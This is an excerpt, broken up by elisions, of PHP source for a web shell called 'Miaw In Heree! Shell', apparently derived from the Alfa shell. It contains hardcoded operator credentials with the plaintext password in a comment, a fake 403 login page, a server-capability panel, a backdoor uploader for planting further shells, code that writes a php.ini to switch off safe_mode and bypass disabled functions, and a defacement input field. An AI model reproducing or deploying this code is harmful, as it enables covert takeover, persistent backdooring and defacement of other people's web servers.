...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'f96078dc1a7e66a2272fab9f3bf83698',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
<title>~ Miaw In Heree! Shell-v'.__wordpress_VERSION__.'-'.__wordpress_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="Miaw In Heree!" draggable="false" src="https://fastseo.site/images/maiw.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Miaw In Heree! Shell-v'.__wordpress_VERSION__.'-'.__wordpress_CODE_NAME__.' ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Miaw In Heree! Shell - v'.__wordpress_VERSION__.'-'.__wordpress_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="wordpress_solevisible"><center><a href="https://www.youtube.com/@casperisback" target="_blank"><span><font class="solevisible-text" color="#6E6BE9">Miaw In Heree!</font></span></a></center></div></td>
</tr>
<tr>
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Miaw In Heree! is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='wordpress'>Miaw In Heree! Uploader</option><option value='my'>My Private Shell</option></select>";
...
<font color='#00A220'>Shell Coded By Ndraa & StrezzBoy (Miaw In Heree!)</font><br>
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Ndraa & StrezzBoy(Miaw In Heree!)");
...
<input type="text" name="defacer" size="67" id="text" placeholder="Miaw In Heree!" />
<br>
